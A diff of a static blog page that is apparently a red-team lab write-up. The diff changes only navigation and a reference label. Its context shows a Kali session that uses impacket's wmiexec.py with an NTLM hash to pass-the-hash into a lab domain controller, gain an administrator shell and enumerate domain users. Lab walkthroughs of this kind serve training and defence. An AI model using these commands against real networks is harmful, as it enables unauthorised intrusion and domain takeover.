@@ -323,6 +323,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/zerologon-master]</span><br><span class="line">└─# git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">Cloning into &#x27;impacket&#x27;...</span><br><span class="line">remote: Enumerating objects: 23605, done.</span><br><span class="line">remote: Counting objects: 100% (181/181), done.</span><br><span class="line">remote: Compressing objects: 100% (130/130), done.</span><br><span class="line">remote: Total 23605 (delta 97), reused 102 (delta 51), pack-reused 23424</span><br><span class="line">Receiving objects: 100% (23605/23605), 10.24 MiB | 2.00 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (17887/17887), done.</span><br><span class="line">                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/zerologon-master]</span><br><span class="line">└─# cd impacket        </span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/zerologon-master/impacket]</span><br><span class="line">└─# python setup.py install</span><br><span class="line">                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/zerologon-master/impacket]</span><br><span class="line">└─# cd examples                                                                                                                      </span><br><span class="line">                                                                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[~/Desktop/zerologon-master/impacket/examples]</span><br><span class="line">└─# python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:db4371323f83b0ad7f16ea72eb1fcd73 god.org/administrator@192.168.52.138</span><br><span class="line">Impacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] SMBv2.1 dialect used</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">C:\&gt;whoami</span><br><span class="line">god\administrator</span><br><span class="line"></span><br><span class="line">C:\&gt;net user /domain</span><br><span class="line">[-] Decoding error detected, consider running chcp.com at the target,</span><br><span class="line">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings</span><br><span class="line">and then execute wmiexec.py again with -codec and the corresponding codec</span><br><span class="line"></span><br><span class="line">\\ ���û��ʻ�</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt                   </span><br><span class="line">ligang                   liukaifeng01             </span><br><span class="line">����������ϣ�������һ����������</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;hostname</span><br><span class="line">owa</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>获得域控</p>
+<p>参考</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46022776/article/details/139295589">https://blog.csdn.net/weixin_46022776/article/details/139295589</a></p>
 
                     </div>
@@ -331,6 +332,13 @@
     <div class="cube-article-nav">
         <ul>
             
+                <li class="prev">
+                    <a href="/2024/09/19/hongri02/">
+                        <i class="cube-icon cube-prev" aria-hidden="true"></i>
+                        hongri02
+                    </a>
+                </li>
+                
                     
                         <li class="next">
                             <a href="/2024/08/03/cont/">
@@ -383,7 +391,7 @@
     
     
     <div class="count">
-        <a class="count articles"><span>21</span>Article</a>
+        <a class="count articles"><span>22</span>Article</a>
         <a class="count tags"><span>0</span>Tags</a>
         <a class="count categories"><span>0</span>Categories</a>
     </div>
@@ -422,7 +430,7 @@
                     <span>1</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/08/20/hongri01/" title="hongri01">hongri01</a>
+                    <a href="/2024/09/19/hongri02/" title="hongri02">hongri02</a>
                 </p>
             </div>
             
@@ -436,7 +444,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/08/03/cont/" title="cont">cont</a>
+                    <a href="/2024/08/20/hongri01/" title="hongri01">hongri01</a>
                 </p>
             </div>
         </li>
@@ -449,7 +457,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/08/01/MyFileServer/" title="MyFileServer">MyFileServer</a>
+                    <a href="/2024/08/03/cont/" title="cont">cont</a>
                 </p>
             </div>
         </li>
@@ -462,7 +470,7 @@
                     <span>4</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/31/rtb1BaJi/" title="rtb1BaJi">rtb1BaJi</a>
+                    <a href="/2024/08/01/MyFileServer/" title="MyFileServer">MyFileServer</a>
                 </p>
             </div>
         </li>
@@ -475,7 +483,7 @@
                     <span>5</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/31/xiaoBaChang/" title="xiaoBaChang">xiaoBaChang</a>
+                    <a href="/2024/07/31/rtb1BaJi/" title="rtb1BaJi">rtb1BaJi</a>
                 </p>
             </div>
         </li>
